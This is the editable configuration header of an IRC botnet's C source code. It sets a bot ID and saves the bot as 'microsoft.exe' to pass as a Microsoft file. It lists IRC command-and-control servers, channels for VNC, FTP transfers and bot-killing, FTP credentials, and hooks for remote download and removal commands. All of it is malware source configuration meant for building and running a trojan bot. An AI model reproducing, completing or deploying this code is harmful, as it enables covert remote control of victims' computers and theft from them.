/////////////
//EDIT HERE//
/////////////

//Bot ID, change this everytime you compile! Can contain random chars, numbers...
char BotID[] = "lk2oij34";

unsigned long mutex_time = 33334; // msec

//Bot file name (save as what name)
char FileName[] = "microsoft.exe";

//IRC servers (you can specify as many as you want servers)
//Hostname or IP, port, TRUE/FALSE to use server pass, server pass
IRCSERVERLIST IrcServerList[] = {
	{"irc.ircnet.net", 6667, FALSE, "pass"},
	{NULL, 0, FALSE, NULL}
};

int reconnect_time = 5000; // msec
int MaxWaitTime = 300; //sec

//Length of nick (how many chars)
unsigned int NickLen = 7;

//Prefix for orders (can be more than 1 char)
char OrderPrefix[] = "!";

char Chan[] = "#t";
BOOL UseChanPass = TRUE;
char ChanPass[] = "pass";
char VNCChan[] = "#vncs";
char TransferChannel[] = "#ftp";
char InfoChan[] = "#info";

//botkiller
char BKChan[] = "#bk";		//channel where botkilling messages get redirected

// for ftpd server
char FTPUser[] = "x";
char FTPPass[] = "y";

// default cftp values
char CFTPHost[32] = "oki";
int CFTPPort = 21;
char CFTPUser[32] = "u2m6g";
char CFTPPass[32] = "k3bmt";
char CFTPFile[32] = "asd";


//Auth host - MUST use, since bot has no login! MD5 hash only!
char *AuthHosts[] = {
	"",
	NULL
};

//Custom commands (MD5 hashes only!)
char Command_Remove[] = ""; //
char Command_Download[] = ""; //
